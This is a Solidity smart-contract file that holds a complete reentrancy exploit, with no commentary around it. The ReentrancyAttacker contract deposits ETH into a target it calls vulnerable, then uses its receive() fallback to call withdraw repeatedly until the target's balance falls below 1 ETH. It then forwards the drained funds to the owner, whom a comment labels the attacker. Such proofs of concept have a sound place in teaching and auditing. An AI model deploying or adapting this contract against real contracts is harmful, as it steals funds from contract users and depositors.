// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerable {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IVulnerable public vulnerableContract;
    address public owner;

    constructor(address _vulnerable) {
        vulnerableContract = IVulnerable(_vulnerable);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 ETH");
        vulnerableContract.deposit{value: msg.value}();
        vulnerableContract.withdraw();
    }

    receive() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw();
        } else {
            payable(owner).transfer(address(this).balance); // Send funds to attacker
        }
    }
}
